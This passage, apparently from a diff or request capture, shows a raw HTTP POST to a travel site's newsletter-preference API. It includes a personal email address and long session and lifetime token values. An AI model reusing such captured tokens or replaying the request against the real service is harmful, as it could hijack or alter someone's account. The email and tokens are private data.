PZ0Q3edlcqscZ0470km8j","tvSession":"/wawPopqJevD3K3aXU0jaeNQOrUXdnu9Dca68uQtJhQnm4qX99gNE846jDD/rrfgDFq0xhtxKsjX2I1EhKFf5TJZq+o+/QiJefFWaHu/3OzGfINcI9bEfFfvQigbVgQ7"},"clientInterface":"desktop"}
+
+
+
+POST /v1/user/changenewsletterpreference HTTP/1.1
+
+Host: api.traveloka.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.traveloka.com/user/editEmailNotification
+Content-Type: application/json
+Content-Length: 784
+origin: https://www.traveloka.com
+Connection: keep-alive
+
+{"data":{"subscriptionCode":null,"subscribe":"true","enableAppNotification":null,"subscriptionEmail":"baguzajjja@gmail.com"},"fields":[],"context":{"tvLifetime":"BDkZSO4VJK5DDR075MdKmxSmNCxiG9IWmWw6vbE0HQE9E5sxvy7ZQTRDE4+0k20Sg9rFggpuDkgBu++Y29cED2ckD/PIVOyCPw4viw120ggyI/uLbysO2NpUaxtFGfg3mhjFqHD08hAvzn0FX3Rc+GnrckFmBngC54QFczhJQAzCpWepfGZ96J03HbFSmHGD2+k59xgmYN0VUnERUam1oUyDZa4gC7+oGnpFKq6cRRsq5Tb6Dqj3m+hKDmzK6XhTmms7vKtS2h2qeLU3t5NI4pDjDFlBZk+9wqgtW8u23bm5LY+SzQZe8x5spKgbArCwUDM44IFP/1jsiA51oT9aKijR6FUNpQWxoZjlNLlene19oyw0B+v5p4v3y/qp/m0f7eoc/CACUPawEP9T2upL5Lgo8dJ1Y+i0Sedng5Wdk1iPZ0Q3edlcqscZ0470km8j","tvSession":"/wawPopqJevD3K3aXU0jaeNQOrUXdnu9Dca68uQtJhQnm4qX99gNE846jDD/rrfgDFq0xhtxKsjX2I1EhKFf5Zwwk/DeuucCq5k31SHn7cTGfINcI9bEfFfvQigbVgQ7"},"clientInterface":"desktop"}
